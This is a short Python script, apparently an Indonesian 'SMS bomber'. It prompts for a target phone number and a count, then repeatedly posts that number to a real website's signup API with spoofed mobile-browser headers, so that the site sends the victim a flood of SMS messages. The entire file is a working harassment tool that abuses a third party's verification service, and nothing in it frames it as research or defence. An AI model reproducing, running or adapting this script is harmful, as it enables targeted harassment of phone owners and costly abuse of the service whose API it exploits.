import time,requests,json,os

k = 0
os.system("clear")
print(f""" \033[1;96m███████╗██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗ 
██╔════╝██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ 
███████╗██████╔╝███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
███████║██║     ██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                         """)
print("SMS UNLIMITED ( BOMM )")
nomer = input("NOMOR TARGET [8xxxxx] = ")
jumlah = int(input("JUMLAH = "))
headers = {
"Host": "eci.id",
"Connection": "keep-alive",
"Content-Length": "27",
"Accept": "application/json, text/plain, */*",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Content-Type": "application/json",
"Origin": "https://eci.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://eci.id/register",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
  k += 1
  pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
  if "success" in pos:
    print("Spam Sms Berhasil Ke",k)
  else:
    print("Spam Sms Gagal Ke",k)